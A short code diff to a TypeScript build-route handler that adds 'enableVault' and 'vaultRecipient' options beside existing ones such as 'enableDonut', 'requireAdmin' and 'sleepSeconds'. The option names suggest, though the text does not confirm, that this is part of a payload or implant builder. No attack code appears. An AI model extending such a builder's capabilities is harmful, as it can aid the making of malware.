@@ -68,6 +68,8 @@ export async function handleBuildRoutes(
         enableDonut,
         enableTyphon,
         typhonVariant,
+        enableVault,
+        vaultRecipient,
         requireAdmin,
         outputExtension,
         sleepSeconds,
@@ -252,6 +254,10 @@ export async function handleBuildRoutes(
         enableDonut: !!enableDonut,
         enableTyphon: !!enableTyphon,
         typhonVariant: !!enableTyphon ? safeTyphonVariant : undefined,
+        enableVault: !!enableVault,
+        vaultRecipient: !!enableVault && typeof vaultRecipient === "string" && vaultRecipient.trim().length > 0
+          ? vaultRecipient.trim().slice(0, 512)
+          : undefined,
         requireAdmin: safeRequireAdmin,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
